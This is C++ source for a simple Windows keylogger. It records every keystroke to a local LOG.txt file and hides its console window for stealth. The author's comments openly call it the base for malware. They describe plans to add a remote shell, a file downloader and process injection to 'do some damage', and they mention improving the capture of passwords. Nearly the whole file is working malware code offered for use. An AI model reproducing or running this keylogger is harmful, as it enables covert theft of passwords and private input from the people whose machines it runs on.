/*
/////////////////////////////////////////////
///Simple keylogger coded by Erick Barrera///
/////////////////////////////////////////////
This is the base for our malware, right
now all it does is log keys. After I implement
winsock it basically is a bot/trojan. Just have to add
a file downloader or remote shell and you can do some damage.
*/

#include <iostream>
#include <windows.h>
#include <winuser.h>

using namespace std;

int LogIt(int key_stroke, char *file);
void HideMe();
//int save();


/*
In the main function it just loops for as long as the program
is running and writes the file "LOG.txt" in whatever directory
the keylogger is run in.
Also only captures in uppercase letters will fix that later for passwords.
*/
int main()
{
    HideMe();
    char i;

    while (1)
    {
        for(i = 8; i <= 190; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
                LogIt(i,"LOG.txt");
        }
    }
    system ("PAUSE");
    return 0;
}
/*
This function logs the key pressed detected
by GetAsyncKeyState() function in main and
writes the key to our log file
More info can be found here: http://msdn.microsoft.com/en-us/library/windows/desktop/ms646293%28v=vs.85%29.aspx
*/

int LogIt (int key_stroke, char *file)
{
    if ( (key_stroke == 1) || (key_stroke == 2) )
        return 0;

    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");

    cout << key_stroke << endl;

    if (key_stroke == 8)
        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    else if (key_stroke == 13)
        fprintf(OUTPUT_FILE, "%s", "\n");
    else if (key_stroke == 32)
        fprintf(OUTPUT_FILE, "%s", " ");
    else if (key_stroke == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (key_stroke == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if (key_stroke == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
    else if (key_stroke == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else if (key_stroke == VK_END)
        fprintf(OUTPUT_FILE, "%s", "[END]");
    else if (key_stroke == VK_HOME)
        fprintf(OUTPUT_FILE, "%s", "[HOME]");
    else if (key_stroke == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "[LEFT]");
    else if (key_stroke == VK_UP)
        fprintf(OUTPUT_FILE, "%s", "[UP]");
    else if (key_stroke == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
    else if (key_stroke == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", "[DOWN]");
    else if (key_stroke == 190 || key_stroke == 110)
        fprintf(OUTPUT_FILE, "%s", ".");
    else
        fprintf(OUTPUT_FILE, "%s", &key_stroke);

    fclose (OUTPUT_FILE);
    return 0;
}

/*
Function to provide basic stealth abilities
All it does is hide the console window.
I was going to make it hide its process in taskmanager
But with the process injection we may not need this function at all.
*/
void HideMe()
{
    HWND consoleWindow;
    AllocConsole();
    consoleWindow = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(consoleWindow,0);
}
